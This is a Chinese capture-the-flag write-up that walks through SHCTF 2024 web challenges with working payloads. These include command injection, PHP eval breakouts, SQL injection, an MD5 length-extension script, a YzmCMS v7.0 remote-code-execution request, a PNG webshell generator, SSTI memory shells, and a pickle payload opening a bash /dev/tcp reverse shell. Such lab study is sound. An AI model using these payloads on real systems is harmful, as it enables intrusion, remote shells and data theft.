---
title: shCTF
date: 2024-10-05 11:47:01
tags: 
      - 复现
      - hash强碰撞
      - hash长度扩展攻击
      - 二次渲染
      - pickle反序列化
      - YzmCMS v7.0漏洞
      - git源码泄露
categories: 比赛复现
---

### WEB

#### [Week1] 1zflask

题目提示robots

![image-20241005114757812](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051148888.png)

那我们访问/robots.txt，得到一个新的文件，我们访问，自动下载了一个py文件

```
import os
import flask
from flask import Flask, request, send_from_directory, send_file

app = Flask(__name__)

@app.route('/api')
def api():
    cmd = request.args.get('SSHCTFF', 'ls /')
    result = os.popen(cmd).read()
    return result
    
@app.route('/robots.txt')
def static_from_root():
    return send_from_directory(app.static_folder,'robots.txt')
    
@app.route('/s3recttt')
def get_source():
    file_path = "app.py"
    return send_file(file_path, as_attachment=True)
 
if __name__ == '__main__':
    app.run(debug=True)
```

我们发现，在api路由里传了一个参数，且默认为ls /，我们访问在这个路由

![image-20241005154858274](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051548372.png)

我们发现flag所在位置，修改SSHCTFF为cat /flag

```
?SSHCTFF=cat /flag
```

得到flag

![image-20241005154942179](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410051549207.png)



#### [Week1] ez_gittt

我们在网页源码里发现提示

![image-20241006200120091](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062001138.png)

想到了git泄露，我们访问.git

![image-20241006200149024](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062001115.png)

进入文件夹

我们在/logs/refs/heads/master里发现修改日志

![image-20241006204926591](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062049670.png)

我们发现他添加了flag，又删除了flag，那我们可以回滚日志，就能找到flag了，我们先用githack把仓库克隆下来

```
python2  GitHack.py http://entry.shc.tf:30187/.git/  
```

克隆后在文件中查询日志

```
git log
```

然后回滚日志

```
git diff 73beab9e53f96cb5d610ee2e95da714844f4cbb3
```

找到flag

#### [Week1] 单身十八年的手速

![image-20241006205113566](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062051642.png)

我们打开页面发现要求点击520次就可获得flag，一看又是个js的题，但我们在game.js直接就找到了flag的base64编码，解码得到flag

![image-20241006205214814](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062052889.png)

#### [Week1] 蛐蛐?蛐蛐!

我们打开源代码，发现有个提示

![image-20241006205440029](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062054069.png)

我们访问source.txt，发现一串代码

```
<?php
if($_GET['ququ'] == 114514 && strrev($_GET['ququ']) != 415411){
    if($_POST['ququ']!=null){
        $eval_param = $_POST['ququ'];
        if(strncmp($eval_param,'ququk1',6)===0){
            eval($_POST['ququ']);
        }else{
            echo("可以让fault的蛐蛐变成现实么\n");
        }
    }
    echo("蛐蛐成功第一步！\n");

}
else{
    echo("呜呜呜fault还是要出题");
}
```

进行代码审计，我们发现get提交的ququ要为114514，它的逆向要不为114514，由于是弱比较，我们让

```
ququ=114514.0就能绕过第一个if
```

而post传递的ququ，它的前6个字符需为ququk1

我们使用?><?php截断eval函数，再重新创个system函数来执行

```
ququk1; ?><?php system("ls");
```

![image-20241006211310235](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062113443.png)

成功得到目录文件

然后我们找到flag所在位置

```
ququk1; ?><?php system("ls ../../../");
```

![image-20241006211356292](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410062113507.png)

将flag输出出来

```
ququk1; ?><?php system("cat ../../../flag");
```

就得到flag了

#### [Week1] poppopop

简单的反序列化

pop链

```
<?php
class SH {

    public static $Web =true;
    public static $SHCTF = true;
}
class C {
    public $p;

}
class T{

    public $n;

}
class F {
    public $o;

}
class SHCTF {
    public $isyou="system";
    public $flag="cat ../../../flllag";

}
$a=new T();
$a->n=new F();
$a->n->o=new C();
$a->n->o->p=new SHCTF();
echo base64_encode((serialize($a)));
```

#### [Week1] MD5 Master

md5	强碰撞

```
<?php
highlight_file(__file__);

$master = "MD5 master!";

if(isset($_POST["master1"]) && isset($_POST["master2"])){
    if($master.$_POST["master1"] !== $master.$_POST["master2"] && md5($master.$_POST["master1"]) === md5($master.$_POST["master2"])){
        echo $master . "<br>";
        echo file_get_contents('/flag');
    }
}
else{
    die("master? <br>");
}
```

我们来审计代码，要传入的maste1和maste2跟master拼接的数据不同，但md5的值要相同，且为md5强碰撞，我们使用fastcoll来生成两个前缀为 `MD5 master!` 且md5一样的文件。

![image-20241024205524693](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242055752.png)

我们使用bp或hackbar将值传上去

这里需要注意的细节是，用hackerbar发送时，要在结尾多添加一个 `&`，因为hackerbar会自动换行

用bp发送时，要把最后的空行删除，不能有多余的东西，或者在结尾多添加一个`&`

```
master1=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00v%CE%0A%9F%DF%0FL%86%AF%DB%14%D4%250o%C6%C6%DB%5D%08%FC%8A%27%9F%1A%AA9F%11%FA%90%11%96%D5%02%E2%BC%D4%2B%1B%8B%06q%A1%17%16%7Fp%0B%3D%CD%5D%FFdu%13%F0%16%E0%ADx%D52%DEnD%FF%85%C6%8C%C3%10E%B2%11%C18%7CM%A8C%7E%BAWd%5B%C2%28%8D%C3+%C8%8B_%88%C8%CBs48%A7%06.TtI%CA%3A%3B%98%0E%9F%F5S%D4%D2%AE%A7q%839IW%A6%11%CF%8Cv&master2=%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00v%CE%0A%9F%DF%0FL%86%AF%DB%14%D4%250o%C6%C6%DB%5D%88%FC%8A%27%9F%1A%AA9F%11%FA%90%11%96%D5%02%E2%BC%D4%2B%1B%8B%06q%A1%17%96%7Fp%0B%3D%CD%5D%FFdu%13%F0%16%E0-x%D52%DEnD%FF%85%C6%8C%C3%10E%B2%11%C18%7CM%A8C%7E%BA%D7d%5B%C2%28%8D%C3+%C8%8B_%88%C8%CBs48%A7%06.TtI%CA%3A%3B%18%0E%9F%F5S%D4%D2%AE%A7q%839IW%26%11%CF%8Cv
```

得到flag

![image-20241024205613719](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242056773.png)

#### [Week2]登录验证

题目说跟jwt有关，那我们先登录

我们发先

密码不是admin会回显错误密码,账号不是admin会回显"你不是admin"

都是admin后回显"你不是真正的admin",此时抓包可以看到cookie处有token

![image-20241024190833511](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241908643.png)

我们把token放到jwt.io里去解密

![image-20241024190859741](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241908783.png)

我们发现这个role是user，我们猜测要将其改为admin，但是我们需要密钥，题目提示可以爆破，那我们用jwt-cracker爆破看看，根据题目描述666666，我们猜测6位弱密码

![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/7qW6h4Sfy6DXkO0QiaOzfHZg049wIQHicnMiaQLianWsb9jbTHXy0xsJjohqzl3dxT8xXZd00Fs4KQypQ0yWtJUt9Q/640?wx_fmt=png&from=appmsg&tp=webp&wxfrom=10005&wx_lazy=1&wx_co=1)

爆破出来密码为222333，我们开始修改jwt

![image-20241024193417201](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241934303.png)

我们将修改后的jwt重新传入token中，刷新页面，得到flag

![image-20241024193912384](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410241939435.png)



#### [Week2]dickle

题目提示说是p不是d，那就是pickle反序列化了

我们查看源码

```
from flask import Flask, request
import pickle
import base64
import io

BLACKLISTED_CLASSES = [
    'subprocess.check_output','builtins.eval','builtins.exec',
    'os.system', 'os.popen', 'os.popen2', 'os.popen3', 'os.popen4', 
    'pickle.load', 'pickle.loads', 'cPickle.load', 'cPickle.loads', 
    'subprocess.call', 'subprocess.check_call', 'subprocess.Popen', 
    'commands.getstatusoutput', 'commands.getoutput', 'commands.getstatus', 
    'pty.spawn', 'posixfile.open', 'posixfile.fileopen',
    '__import__','os.spawn*','sh.Command','imp.load_module','builtins.compile'
    'eval', 'builtins.execfile', 'compile', 'builtins.open', 'builtins.file', 'os.system', 
    'os.fdopen', 'os.tmpfile', 'os.fchmod', 'os.fchown', 'os.open', 'os.openpty', 'os.read', 'os.pipe',
    'os.chdir', 'os.fchdir', 'os.chroot', 'os.chmod', 'os.chown', 'os.link', 'os.lchown', 'os.listdir',
    'os.lstat', 'os.mkfifo', 'os.mknod', 'os.access', 'os.mkdir', 'os.makedirs', 'os.readlink', 'os.remove',
    'os.removedirs', 'os.rename', 'os.renames', 'os.rmdir', 'os.tempnam', 'os.tmpnam', 'os.unlink', 'os.walk',
    'os.execl', 'os.execle', 'os.execlp', 'os.execv', 'os.execve', 'os.dup', 'os.dup2', 'os.execvp', 'os.execvpe',
    'os.fork', 'os.forkpty', 'os.kill', 'os.spawnl', 'os.spawnle', 'os.spawnlp', 'os.spawnlpe', 'os.spawnv',
    'os.spawnve', 'os.spawnvp', 'os.spawnvpe', 'pickle.load', 'pickle.loads', 'cPickle.load', 'cPickle.loads',
    'subprocess.call', 'subprocess.check_call', 'subprocess.check_output', 'subprocess.Popen',
    'commands.getstatusoutput', 'commands.getoutput', 'commands.getstatus', 'glob.glob',
    'linecache.getline', 'shutil.copyfileobj', 'shutil.copyfile', 'shutil.copy', 'shutil.copy2', 'shutil.move',
    'shutil.make_archive', 'popen2.popen2', 'popen2.popen3', 'popen2.popen4', 'timeit.timeit', 'sys.call_tracing',
    'code.interact', 'code.compile_command', 'codeop.compile_command', 'pty.spawn', 'posixfile.open',
    'posixfile.fileopen'
]

class SafeUnpickler(pickle.Unpickler):
    def find_class(self, module, name):
        print(f'find_class {moudle}.{name}')
        if f"{module}.{name}" in BLACKLISTED_CLASSES:
            raise pickle.UnpicklingError("Forbidden class: %s.%s" % (module, name))
        return super().find_class(module, name)

app = Flask(__name__)

@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "POST":
        encoded_data = request.form["data"]
        decoded_data = base64.b64decode(encoded_data)
        
        try:
            data_stream = io.BytesIO(decoded_data)
            unpickler = SafeUnpickler(data_stream)
            print(unpickler.load())
            return f"Deserialized data: {list(result)}"
        except Exception as e:
            return f"Error during deserialization: {str(e)}"
    else:
        return """
        <form method="post">
            <label for="data">Enter your serialized data:</label><br>
            <textarea id="data" name="data"></textarea><br>
            <input type="submit" value="Submit">
        </form>
        """

if __name__ == "__main__":
    app.run(port=8080)

```

我们看到黑名单里过滤了os.system

在反序列化过程中，如果 `pickle` 模块遇到一个表示类的标记，它会调用 `find_class` 方法来查找和创建相应的类实例。

`find_class` 方法将识别到的 `module` 和 `name` 取决于 `reduce` 方法返回的内容。

`module`是类的模块名，例如 "`os`"。`name`是类名，例如 "`system`"

我们本地运行加一个打印find_class的结果

![image-20241024202014650](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242020742.png)

在反序列化过程中， pickle 使用 `find_class` 方法来定位和导入必要的类或函数。由于 pickle 记录的是 `posix.system`，因此`find_class` 会从 posix 模块中导入 system 函数，而不是从 os 模块中导入。

所以可以用`os.system`

![image-20241024202032803](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242020845.png)

我们进行pickle反序列化

```
import base64
import pickle
import os

class A(object):
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/ip/端口 0>&1'",))
a = A()
print( base64.b64encode( pickle.dumps(a) ) )

```

先监听端口

```
nc -lvvp 端口

若出现nc: getnameinfo: Temporary failure in name resolution
使用 nc -lvnp 端口
```

然后将反序列化的结果传上去反弹shell，查找flag

![image-20241024202255967](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242022040.png)

#### [Week2]自助查询

我们使用1")就能将sql语句闭合，然后就是正常的sql注入过程

```
-1"）union select 1,database()#
```

 ctf

```
-1") union select 1,group_concat(table_name) from information_schema.tables where table_schema="ctf"#
```

flag,users

```
-1") union select 1,group_concat(column_name) from information_schema.columns where table_name="flag"#
```

id,scretdata

```
-1") union select 1,group_concat(scretdata) from flag#
```

被你查到了, 果然不安全,把重要的东西写在注释就不会忘了

我们去查找列注释

```
-1") union select 1,column_comment from information_schema.columns
```

得到flag

![image-20241024204344539](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410242043580.png)

#### [Week2]MD5 GOD!

我们先开始代码审计

我们由源码可知，当64个用户签到成功后即可得到flag

```
@app.route("/flag")
def flag():
    for user in users:
        if sign_users[user] != 1:
            return "flag{杂鱼~}"
    return open('/flag', 'r').read()
```

访问users路由可以知道用户的签到状态

/login 路由可以登录

/ 路由是用来签到的

/flag 能得到flag

我们来观察签到逻辑和验证函数

```
def check_sign(sign, username, msg, salt):
    if sign == md5(salt + msg + username):
        return True
    return False

@app.route("/")
def index():
    if session.get('sign') == None or session.get('username') == None or session.get('msg') == None:
        return redirect("/login")
    sign = session.get('sign')
    username = session.get('username')
    msg = session.get('msg')
    if check_sign(sign, username, msg, salt):
        sign_users[username.decode()] = 1
        return "签到成功"
    return redirect("/login")
```

我们可以知道，只要session里的sign和最终`md5(salt + msg + username)` 相等即可签到成功

这里的salt是未知的，但最初的账号 student 的所有信息是已知的，可以用这个账号的相关信息来做hash长度拓展攻击

hash长度拓展攻击的代码可以去网上找现成的

接着是session伪造，`SECRET_KEY` 已经给出是 `Th1s_is_5ecr3t_k3y`，写脚本的时候可以参考 `flask_session_cookie_manager3.py`里的代码

```
import hashlib
import math
from typing import Any, Dict, List

rotate_amounts = [7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22,
                  5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20, 5, 9, 14, 20,
                  4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23,
                  6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21]

constants = [int(abs(math.sin(i + 1)) * 2 ** 32) & 0xFFFFFFFF for i in range(64)]

functions = 16 * [lambda b, c, d: (b & c) | (~b & d)] + \
            16 * [lambda b, c, d: (d & b) | (~d & c)] + \
            16 * [lambda b, c, d: b ^ c ^ d] + \
            16 * [lambda b, c, d: c ^ (b | ~d)]

index_functions = 16 * [lambda i: i] + \
                  16 * [lambda i: (5 * i + 1) % 16] + \
                  16 * [lambda i: (3 * i + 5) % 16] + \
                  16 * [lambda i: (7 * i) % 16]


def get_init_values(A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -> List[int]:
    return [A, B, C, D]


def left_rotate(x, amount):
    x &= 0xFFFFFFFF
    return ((x << amount) | (x >> (32 - amount))) & 0xFFFFFFFF


def padding_message(msg: bytes) -> bytes:
    """
    在MD5算法中，首先需要对输入信息进行填充，使其位长对512求余的结果等于448，并且填充必须进行，即使其位长对512求余的结果等于448。
    因此，信息的位长（Bits Length）将被扩展至N*512+448，N为一个非负整数，N可以是零。
    填充的方法如下：
        1) 在信息的后面填充一个1和无数个0，直到满足上面的条件时才停止用0对信息的填充。
        2) 在这个结果后面附加一个以64位二进制表示的填充前信息长度（单位为Bit），如果二进制表示的填充前信息长度超过64位，则取低64位。
    经过这两步的处理，信息的位长=N*512+448+64=(N+1）*512，即长度恰好是512的整数倍。这样做的原因是为满足后面处理中对信息长度的要求。
    """
    orig_len_in_bits = (8 * len(msg)) & 0xffffffffffffffff
    msg += bytes([0x80])
    while len(msg) % 64 != 56:
        msg += bytes([0x00])
    msg += orig_len_in_bits.to_bytes(8, byteorder='little')
    return msg


def md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -> int:
    message = padding_message(message)
    hash_pieces = get_init_values(A, B, C, D)[:]
    for chunk_ofst in range(0, len(message), 64):
        a, b, c, d = hash_pieces
        chunk = message[chunk_ofst:chunk_ofst + 64]
        for i in range(64):
            f = functions[i](b, c, d)
            g = index_functions[i](i)
            to_rotate = a + f + constants[i] + int.from_bytes(chunk[4 * g:4 * g + 4], byteorder='little')
            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) & 0xFFFFFFFF
            a, b, c, d = d, new_b, b, c
        for i, val in enumerate([a, b, c, d]):
            hash_pieces[i] += val
            hash_pieces[i] &= 0xFFFFFFFF

    return sum(x << (32 * i) for i, x in enumerate(hash_pieces))


def md5_to_hex(digest: int) -> str:
    raw = digest.to_bytes(16, byteorder='little')
    return '{:032x}'.format(int.from_bytes(raw, byteorder='big'))


def get_md5(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe, D: int = 0x10325476) -> str:
    return md5_to_hex(md5(message, A, B, C, D))


def md5_attack(message: bytes, A: int = 0x67452301, B: int = 0xefcdab89, C: int = 0x98badcfe,
               D: int = 0x10325476) -> int:
    hash_pieces = get_init_values(A, B, C, D)[:]
    for chunk_ofst in range(0, len(message), 64):
        a, b, c, d = hash_pieces
        chunk = message[chunk_ofst:chunk_ofst + 64]
        for i in range(64):
            f = functions[i](b, c, d)
            g = index_functions[i](i)
            to_rotate = a + f + constants[i] + int.from_bytes(chunk[4 * g:4 * g + 4], byteorder='little')
            new_b = (b + left_rotate(to_rotate, rotate_amounts[i])) & 0xFFFFFFFF
            a, b, c, d = d, new_b, b, c
        for i, val in enumerate([a, b, c, d]):
            hash_pieces[i] += val
            hash_pieces[i] &= 0xFFFFFFFF

    return sum(x << (32 * i) for i, x in enumerate(hash_pieces))


def get_init_values_from_hash_str(real_hash: str) -> List[int]:
    """

    Args:
        real_hash: 真实的hash结算结果

    Returns: 哈希初始化值[A, B, C, D]

    """
    str_list: List[str] = [real_hash[i * 8:(i + 1) * 8] for i in range(4)]
    # 先按照小端字节序将十六进制字符串转换成整数，然后按照大端字节序重新读取这个数字
    return [int.from_bytes(int('0x' + s, 16).to_bytes(4, byteorder='little'), byteorder='big') for s in str_list]


def get_md5_attack_materials(origin_msg: bytes, key_len: int, real_hash: str, append_data: bytes) -> Dict[str, Any]:
    """

    Args:
        origin_msg: 原始的消息字节流
        key_len: 原始密钥（盐）的长度
        real_hash: 计算出的真实的hash值
        append_data: 需要添加的攻击数据

    Returns: 发起攻击需要的物料信息
        {
            'attack_fake_msg': bytes([...]),
            'attack_hash_value': str(a1b2c3d4...)
        }

    """
    init_values = get_init_values_from_hash_str(real_hash)
    # print(['{:08x}'.format(x) for x in init_values])
    # 只知道key的长度，不知道key的具体内容时，任意填充key的内容
    fake_key: bytes = bytes([0xff for _ in range(key_len)])
    # 计算出加了append_data后的真实填充数据
    finally_padded_attack_data = padding_message(padding_message(fake_key + origin_msg) + append_data)
    # 攻击者提前计算添加了攻击数据的哈希
    attack_hash_value = md5_to_hex(md5_attack(finally_padded_attack_data[len(padding_message(fake_key + origin_msg)):],
                                              A=init_values[0],
                                              B=init_values[1],
                                              C=init_values[2],
                                              D=init_values[3]))
    fake_padding_data = padding_message(fake_key + origin_msg)[len(fake_key + origin_msg):]
    attack_fake_msg = origin_msg + fake_padding_data + append_data
    return {'attack_fake_msg': attack_fake_msg, 'attack_hash_value': attack_hash_value}



from flask.sessions import SecureCookieSessionInterface
import requests, json, time

class MockApp(object):
    def __init__(self, secret_key):
        self.secret_key = secret_key


def session_decode(session_cookie_value, secret_key):
    """ Decode a Flask cookie  """
    app = MockApp(secret_key)
    si = SecureCookieSessionInterface()
    s = si.get_signing_serializer(app)
    return s.loads(session_cookie_value)


def session_encode(session_cookie_structure, secret_key):
    """ Encode a Flask session cookie """
    try:
        app = MockApp(secret_key)
        # session_cookie_structure = dict(ast.literal_eval(session_cookie_structure))
        si = SecureCookieSessionInterface()
        s = si.get_signing_serializer(app)
        return s.dumps(session_cookie_structure)
    except Exception as e:
        return "[Encoding error] {}".format(e)


def req_index(url, cookie):
    # headers = {"Cookie": "session=" + cookie}
    cookies = {"session":cookie}
    r = requests.get(url, cookies=cookies).text
    # print(r)
    if '签到成功' not in r:
        # print(cookie)
        time.sleep(1)
        req_index(url, cookie)
        # print(r)

def req_user(url):
    return json.loads(requests.get(url).text)

def req_login(url):
    data = {"username":"student", "password":"student"}
    cookie = requests.post(url, data).headers["Set-Cookie"][8:].split(';')[0]
    # print(cookie)
    return cookie

def hash_Attack(md5_value, key_len, data, attack_data):
    attack_materials = get_md5_attack_materials(data, key_len, md5_value.decode(), attack_data)
    # print(data)
    res = {"username":attack_data, "msg":attack_materials['attack_fake_msg'][:-len(attack_data)], "sign":attack_materials['attack_hash_value'].encode()}
    return res


if __name__ == '__main__':
    url = "http://210.44.150.15:49982/"
    cookie = req_login(url+'login')
    users = req_user(url+'users')
    secret_key = "Th1s_is_5ecr3t_k3y"
    res = session_decode(cookie, secret_key)
    for user in users:
        if users[user] == 0:
            res = hash_Attack(res["sign"], 16, res["msg"]+res["username"], user.encode())
            res2 = session_encode(res, secret_key)
            # time.sleep(1)
            r = req_index(url, res2)
```

跑完这个脚本后，访问/flag得到flag



#### [Week3] 小小cms

我们看到这是个YzmCMS内容管理系统，而且最近更新提到了它的版本

![image-20241025203326461](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252033701.png)

我们上网查查YzmCMS v7.0的漏洞https://blog.csdn.net/shelter1234567/article/details/138524342

文章提到  YzmCMS 某些接口调用了 db_pdo类的where方法 导致了远程命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统指令，写入后门文件，最终可获取服务器权限。

影响版本<=7.0

进行漏洞分析

在db_pdo.class.php文件中，db_pdo存在where方法。在195行出现了$fun(\$rule)的执行方法

![image-20241025205145464](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252051517.png)

如果$fun和\$rule都为可控参数就会形成“exec(calc)”的危险函数调用漏洞

分析$fun与\$rulee是如何传参的

首先在187行与188行\$rule为\$vv[1]得到， \$fun为$vv[2] 得到

![image-20241025205457147](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252054205.png)

向上分析$vv(本身数组)是数组\$args中遍历的，经过测试\$args其实是where函数的参数\$arr赋予的

接下来我们要分析谁可以调用db_pdo类的where方法



调用where的方法有很多，但调用的同时要考虑参数是否可控，是否传递数组

这里根据poc提供一个函数调用的地方

位于pay/controller/index.class.php中的pay_callback方法

![image-20241025211301663](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252113737.png)

```
$out_trade_no = $_POST['out_trade_no'];
$order = D('order')->field('id,order_sn,status,userid,username,paytype,money,quantity,`type`,`desc`')->where(array('order_sn' => $out_trade_no))->find();
```

经过前面的分析，传递的参数的是数组，这里已经符合要求了。我们只需将 $out_trade_no变为数组即可，且out_trade_no[2]为调用函数out_trade_no[1]为调用函数参数

根据框架的的控制器一般调用方法，欲想调用pay_callback方法 需构造这样的url "pay/index/pay_callback"

可以先这样访问看看行不行，如果不行在分析代码是否禁用的这种方式，是否有自己定义路由，是否有自己定义前缀，后缀。

##### **漏洞复现**

根据前面的分析的我们这样发请求行不行

```
POST /yzmcms-7.0/pay/index/pay_callback HTTP/1.1

Host: 127.0.0.1
Cookie: ;XDEBUG_SESSION=19079
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

out_trade_no[0]=&out_trade_no[1]=calc&out_trade_no[2]=exec
```

![image-20241025212612772](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252126834.png)

由于out_trade_no没有0的值，出现了错误

其实我们前面忽略了一点，就是out_trade_no[0]的处理

![image-20241025212255581](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252122634.png)

\$vv[0]需是$exp_arr存在的健，根据184行，我们随便找一个键 eq。构造如下payload

```
out_trade_no[0]=eq&out_trade_no[1]=calc&out_trade_no[2]=exec
```

系统成功执行了exec(calc)函数，实现了任意函数调用

![img](https://i-blog.csdnimg.cn/blog_migrate/87a906a53cfcc4947e39a76883a63591.png)

回到本题，我们访问/pay/index/pay_callback，post传一个

```
out_trade_no[0]=eq&out_trade_no[1]=env&out_trade_no[2]=system
```

得到flag

![image-20241025212840514](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252128569.png)



#### [Week3] 拜师之旅·番外

我们随便传上一张png图片

当上传一张图片成功后,查看图片可以发现是通过GET传文件路径来显示的,考虑存在include包含

我们将图片下载下来，放入010中与原文件进行对比

![image-20241025213527421](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252135483.png)

发现只有一部分相同，其余的大多被更改了，我们想到图片的二次渲染

此时需要构造一张不被渲染掉的png图片马,这里借用了网上的脚本

```
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
    0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
    0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
    0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
    0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
    0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
    0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
    0x66, 0x44, 0x50, 0x33);

$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
    $r = $p[$y];
    $g = $p[$y+1];
    $b = $p[$y+2];
    $color = imagecolorallocate($img, $r, $g, $b);
    imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'1.png');  //要修改的图片的路径

/* 木马内容
<?$_GET[0]($_POST[1]);?>
 */
?>
```

我们将生成的图片上传上去

并在查看图片页面进行命令执行

```
GET  :靶机地址/?image=/upload/293146324.png&0=system

POST:1=tac /f*
```

执行一次后，我们重新将图片下载下来，放到010里查看

得到flag

![image-20241025214247705](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410252142777.png)

#### [Week3] love_flask

```
@app.route('/')
def pretty_input():
    return render_template_string(html_template)
//render_template_string 允许开发者直接从字符串中渲染模板
@app.route('/namelist', methods=['GET'])
def name_list():
    name = request.args.get('name')  
    template = '<h1>Hi, %s.</h1>' % name
    rendered_string =  render_template_string(template)
    if rendered_string:
        return 'Success Write your name to database'
    else:
        return 'Error'

if __name__ == '__main__':
    app.run(port=8080)
```

从源码中我们可以发现输入可控，而且经过了渲染，明显的ssti模版注入

此外，我们还发现源码没有回显ssti的结果

可以看到没有任何的过滤

所以我们有两种办法

一种是盲注，因为渲染失败会返回500，所以可以先爆出eval

```
/namelist?name={{().__class__.__base__.__subclasses__()[{{int(100-200)}}].__init__.__globals__['__builtins__']['eval']('__import__("time").sleep(3)')}}
```

![image-20241027144758194](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271448305.png)

我们可以通过构造延时来爆flag

```
import requests
import time
flag ='SHCTF{'
table = '-ABCDEFabcdef0123456789'
url = 'http://210.44.150.15:25528/namelist?name='
for len in range(7,43):
    for i in table:
      ii = flag +i
      start_time = time.time()
      data = "{{"+"().__class__.__base__.__subclasses__()[100].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"if [ $(head -c {} /flag) = {} ]; then sleep 2; fi\").read()')".format(len,ii) +"}}"
      #print(data)
      url1 = url + data
      r = requests.get(url1)
      end_time = time.time()
      response_time = end_time - start_time
      if response_time >= 2:
          flag = flag +i
          print(flag)
      else:
          continue
print(flag+'}')
```

if [ $(head -c {} /flag) = {} ]; then sleep 2; 

**`head -c {}`**：

- `head`是一个用于输出文件开头部分的命令。
- `-c {}`选项表示输出文件的前`{}`个字节。这个`{}`在实际代码中将被替换为一个整数值，代表要读取的字节数。
- `/flag`是要检查的文件路径。

**`$(...)`**：

- 这是命令替换（command substitution），用于将命令的输出作为字符串插入到另一个命令中。
- 在这里，`$(head -c {} /flag)`会输出`/flag`文件的前`{}`个字节的内容。

**`sleep 2`**：

- `sleep`命令用于使程序暂停指定的时间（在这里是2秒）。
- 如果`head`命令的输出与`{}`相等，则执行`sleep 2`，造成响应延迟。

**`then ... fi`**：

- `then`表示条件为真时执行的命令块的开始，`fi`表示`if`语句的结束。

##### 第二种方法

我们可以通过构造内存马

https://xz.aliyun.com/t/10933?time__1311=CqjxRQiQqQqqlxGg6QGCDcmQD80rdDCbAeD

```
{{url_for.__globals__['__builtins__']['eval']("app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())",{'_request_ctx_stack':url_for.__globals__['_request_ctx_stack'],'app':url_for.__globals__['current_app']})}}
```

我们先运行一遍，然后再访问/shell?cmd=tac /f*

![](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271528055.png)

#### [Week3] hacked_website

我们扫描目录，发现有个www.zip，我们把它下载下来，然后用D盾扫描，发现后门文件

![image-20241027164736366](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271647524.png)

我们打开这个文件

![image-20241027164847997](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271648116.png)

```
<?php $a = 'sys';$b = 'tem';$x = $a.$b;if (!isset($_POST['SH'])) {$z = "''";} else $z = $_POST['SH'];?>
```

我们可以发现可以命令执行，在/admin/profile.php下传一个SH来进行rce

但首先我们要进行登录

进入/admin根据文章发布者，账号为admin，爆破密码，结果为qwer1234

然后我们执行命令，得到flag

![image-20241027165129138](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410271651197.png)

##### 解法二

在控制台-外观-编辑当前外观处编辑模板

